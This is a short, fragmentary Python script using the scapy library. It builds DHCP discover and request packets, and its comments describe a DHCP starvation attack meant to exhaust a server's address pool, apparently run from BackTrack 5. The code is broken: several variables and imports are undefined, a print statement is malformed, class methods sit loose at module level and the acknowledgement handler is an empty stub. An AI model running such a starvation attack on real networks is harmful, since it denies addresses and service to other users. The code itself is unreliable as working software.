from scapy.all import IP, Ether, ICMP, UDP, raw, BOOTP, DHCP, sr1, send, srp
from scapy.utils import *


def dhcp_discover(hostname,smac):
    dhcp_discover =  Ether(src=smac,dst="ff:ff:ff:ff:ff:ff")/ \
                     IP(src="0.0.0.0",dst="255.255.255.255")/ \
                     UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(smac)])/ \
                     DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])

    return dhcp_discover


def dhcp_request(sip,myip,hostname,smac):
    dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/ \
               IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/ \
               BOOTP(chaddr=[mac2str(smac)],xid=localxid)/ \
               DHCP(options=[("message-type","request"), \
               ("server_id",sip),("requested_addr",myip), \
               ("hostname",myhostname),("param_req_list","pad"),"end"])

    return dhcp_req

def dcp_ack():
    pass

def start(self):
    # start packet listening thread
    thread = Thread(target=self.listen)
    thread.start()
    print "Starting DHCP starvation..."
    # Keep starving until all 100 targets are registered
    # 100~200 excepts 107 = 100
    while len(self.ip) < 100: self.starve()
    print "Targeted IP address starved"


def handle_dhcp(self, pkt):
    if pkt[DHCP]:
        # if DHCP server reply ACK, the IP address requested is registered
        # 10.10.111.107 is IP for bt5, not to be starved
        print "dst ip %s", pkt[IP]
        print "DHCP options %s" pkt[DHCP].options[0][1] 

def recv(self):
    # sniff DHCP packets
    return sniff(filter="udp and (port 67 or port 68)",
                 prn=self.handle_dhcp,
                 store=0)

dhcp_discover_msg = dhcp_discover('Leaf','02:42:0a:57:46:fb')

while(True):
    srp(dhcp_discover_msg)
    time.sleep(10)
    recv() 
